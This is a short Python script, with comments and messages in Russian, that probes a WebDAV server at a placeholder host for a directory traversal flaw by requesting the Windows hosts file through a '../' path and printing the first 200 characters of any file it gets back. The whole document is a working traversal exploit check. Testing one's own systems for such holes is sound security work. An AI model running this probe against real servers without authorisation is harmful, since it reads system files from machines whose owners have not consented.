import requests

url = "http://example.com/webdav/../../../../windows/system32/drivers/etc/hosts"
response = requests.get(url)
if response.status_code == 200:
    print("[+] Потенциальная уязвимость обнаружена. Ответ сервера:")
    print(response.text[:200])  # Выводим первые 200 символов
else:
    print("[-] Уязвимость не подтверждена. Код ответа:", response.status_code)
